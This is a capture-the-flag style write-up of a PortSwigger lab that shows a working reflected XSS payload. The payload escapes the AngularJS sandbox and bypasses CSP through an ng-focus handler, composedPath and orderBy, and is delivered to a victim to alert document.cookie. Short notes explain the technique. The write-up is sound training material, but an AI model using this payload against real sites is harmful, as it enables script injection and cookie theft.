# XSS - Reflected XSS with AngularJS sandbox escape and CSP

## 📌 Lab Details
- **Title**: Reflected XSS with AngularJS sandbox escape and CSP
- **Difficulty**: Expert
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/978febc1996cddc2b7cd48d98a7675b4c51e498017943479c16896589a51c363?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2fclient-side-template-injection%2flab-angular-sandbox-escape-and-csp

## 🔍 Summary
This lab shows how to bypass strict Content Security Policy (CSP) and AngularJS sandbox restrictions to execute JavaScript, specifically to alert the victim’s cookies. 

## 🛠 Payload Used 
```sh
location='https://0a03008c04079241805fd06d009200210.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
```
Click Store and 'Deliver Exploit to victim'.

## 📖 Key Takeaways
- **Focus event trigger**: The `ng-foucs` event is used to execute the payload when the element gain focus, making the attack automatic.
- **CSP bypass**: You can run JavaScript by injecting code into allowed HTML attributes instead of inline scripts.
- **Event path usage**: `event.composedPath()` provides access to the event propagation path, including the `window` object which is usually restricted.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/5ff0679f-5aee-4bdc-8156-a49f81f8908a)
![image](https://github.com/user-attachments/assets/63d02320-39f7-43b0-bb03-e8596f06f5bb)
![image](https://github.com/user-attachments/assets/c820afdd-22d3-4674-95f5-9e2fb913d6ff)
